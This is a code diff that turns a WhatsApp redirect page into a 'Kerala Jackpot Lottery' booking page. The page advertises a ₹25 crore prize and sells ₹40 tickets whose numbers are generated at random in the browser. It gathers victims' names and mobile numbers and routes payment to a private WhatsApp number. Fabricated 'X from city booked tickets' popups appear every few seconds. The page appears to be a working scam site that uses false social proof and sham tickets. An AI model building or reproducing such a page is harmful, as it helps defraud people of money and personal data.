@@ -1,16 +1,349 @@
-<!DOCTYPE html><html>
+<!doctype html>
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Opening WhatsApp...</title><script>
-var phone = "+96566323061";
-var message = "Book Ticket";
-var url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Kerala Jackpot Lottery</title>
 
-window.location.replace("whatsapp://send?phone=" + phone + "&text=" + encodeURIComponent(message));
+<style>
 
-setTimeout(function(){
-window.location.replace(url);
-}, 500);
-</script></head>
-<body></body>
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(135deg,#ffecd2,#fcb69f);
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.container{
+position:relative;
+width:100%;
+max-width:420px;
+height:100vh;
+background:#fff;
+display:flex;
+flex-direction:column;
+overflow:hidden;
+}
+
+.headerImg{
+width:100%;
+height:28%;
+object-fit:cover;
+}
+
+.prize{
+background:#e53935;
+color:#fff;
+text-align:center;
+padding:10px;
+font-weight:bold;
+font-size:16px;
+animation:blink 1s infinite;
+}
+
+@keyframes blink{
+50%{opacity:.5}
+}
+
+/* WHATSAPP BUTTON */
+
+.whatsapp{
+position:absolute;
+top:10px;
+right:10px;
+background:linear-gradient(45deg,#25D366,#1ebe5d);
+color:#fff;
+padding:10px 14px;
+border-radius:50px;
+display:flex;
+align-items:center;
+gap:6px;
+font-weight:bold;
+text-decoration:none;
+font-size:13px;
+animation:bounce 1.4s infinite;
+box-shadow:0 5px 12px rgba(0,0,0,.3);
+}
+
+.whatsapp img{
+width:18px;
+}
+
+@keyframes bounce{
+0%{transform:translateY(0)}
+50%{transform:translateY(-6px)}
+100%{transform:translateY(0)}
+}
+
+.popup{
+position:absolute;
+top:22%;
+left:50%;
+transform:translateX(-50%);
+background:#000;
+color:#fff;
+padding:7px 12px;
+font-size:12px;
+border-radius:8px;
+display:none;
+z-index:5;
+}
+
+.form{
+padding:10px;
+display:flex;
+flex-direction:column;
+gap:6px;
+overflow:auto;
+}
+
+input{
+padding:10px;
+border-radius:8px;
+border:1px solid #ccc;
+font-size:14px;
+}
+
+.error{
+font-size:11px;
+color:#e53935;
+}
+
+.ticketNote{
+font-size:12px;
+color:#d32f2f;
+text-align:center;
+font-weight:bold;
+}
+
+.ticketGrid{
+display:grid;
+grid-template-columns:repeat(4,1fr);
+gap:6px;
+height:200px;
+overflow:auto;
+border:2px dashed #ff4081;
+padding:6px;
+border-radius:8px;
+}
+
+.ticket{
+background:#f5f5f5;
+padding:6px;
+text-align:center;
+border-radius:6px;
+font-size:12px;
+cursor:pointer;
+border:1px solid #ddd;
+}
+
+.ticket.active{
+background:#4caf50;
+color:#fff;
+}
+
+.amount{
+background:#e8f5e9;
+padding:6px;
+border-radius:6px;
+text-align:center;
+font-weight:bold;
+}
+
+button{
+padding:12px;
+border:none;
+border-radius:10px;
+background:#00c853;
+color:#fff;
+font-weight:bold;
+font-size:15px;
+animation:pulse 1.2s infinite;
+}
+
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.05)}
+100%{transform:scale(1)}
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<a id="waBtn" class="whatsapp" target="_blank">
+<img src="https://cdn-icons-png.flaticon.com/512/733/733585.png">
+Chat on WhatsApp
+</a>
+
+<img src="https://i.postimg.cc/7L3ZWfQh/Onam-bumper.jpg" class="headerImg">
+
+<div class="prize">
+🔥 FIRST PRIZE ₹25 CRORE
+</div>
+
+<div id="popup" class="popup"></div>
+
+<div class="form">
+
+<input id="name" placeholder="Enter Your Full Name">
+<div id="nameErr" class="error"></div>
+
+<input id="mobile" placeholder="Enter 10 Digit Mobile Number" maxlength="10">
+<div id="mobileErr" class="error"></div>
+
+<div id="ticketNote" class="ticketNote"></div>
+
+<div id="ticketGrid" class="ticketGrid"></div>
+
+<div id="amount" class="amount"></div>
+
+<button onclick="submitForm()">
+Submit & Continue To WhatsApp
+</button>
+
+</div>
+</div>
+
+<script>
+
+const WHATSAPP_NUMBER="919576474438";
+document.getElementById("waBtn").href="https://wa.me/"+WHATSAPP_NUMBER;
+
+const PRICE=40;
+let selected=[];
+
+const grid=document.getElementById("ticketGrid");
+const amount=document.getElementById("amount");
+const note=document.getElementById("ticketNote");
+
+/* GENERATE 2000 TICKETS */
+
+for(let i=0;i<2000;i++){
+
+let num="KL"+("000000"+Math.floor(Math.random()*999999)).slice(-6);
+
+let div=document.createElement("div");
+div.className="ticket";
+div.innerText=num;
+
+div.onclick=function(){
+
+if(selected.includes(num)){
+selected=selected.filter(t=>t!==num);
+div.classList.remove("active");
+}else{
+selected.push(num);
+div.classList.add("active");
+}
+
+update();
+
+};
+
+grid.appendChild(div);
+
+}
+
+function update(){
+
+let count=selected.length;
+let total=count*PRICE;
+
+if(count==1){
+
+note.innerText="Minimum 2 tickets required";
+amount.innerText="";
+
+}else if(count>=2){
+
+note.innerText="";
+amount.innerText="Tickets: "+count+" | Amount ₹"+total;
+
+}else{
+
+note.innerText="";
+amount.innerText="";
+
+}
+
+}
+
+/* MOBILE NUMBER ONLY */
+
+document.getElementById("mobile").addEventListener("input",function(){
+this.value=this.value.replace(/\D/g,'');
+});
+
+/* SUBMIT */
+
+function submitForm(){
+
+let name=document.getElementById("name").value.trim();
+let mobile=document.getElementById("mobile").value.trim();
+
+document.getElementById("nameErr").innerText="";
+document.getElementById("mobileErr").innerText="";
+
+if(name==""){
+document.getElementById("nameErr").innerText="Enter your full name";
+return;
+}
+
+if(mobile.length!=10){
+document.getElementById("mobileErr").innerText="Enter valid 10 digit mobile number";
+return;
+}
+
+if(selected.length<2){
+note.innerText="Minimum 2 tickets required";
+return;
+}
+
+let msg=`Kerala Jackpot Booking
+
+Name: ${name}
+Mobile: ${mobile}
+
+Tickets:
+${selected.join(", ")}
+
+Amount ₹${selected.length*PRICE}`;
+
+window.location.href="https://wa.me/"+WHATSAPP_NUMBER+"?text="+encodeURIComponent(msg);
+
+}
+
+/* AUTO BOOKING POPUP */
+
+const names=["Arjun","Karthik","Vijay","Rahul","Ramesh","Naveen"];
+const cities=["Chennai","Bangalore","Kochi","Hyderabad"];
+
+function autoPopup(){
+
+let name=names[Math.floor(Math.random()*names.length)];
+let city=cities[Math.floor(Math.random()*cities.length)];
+let t=Math.floor(Math.random()*3)+2;
+
+let popup=document.getElementById("popup");
+
+popup.innerText=name+" from "+city+" booked "+t+" tickets 🎟";
+
+popup.style.display="block";
+
+setTimeout(()=>popup.style.display="none",2500);
+
+}
+
+setInterval(autoPopup,3500);
+
+</script>
+
+</body>
 </html>
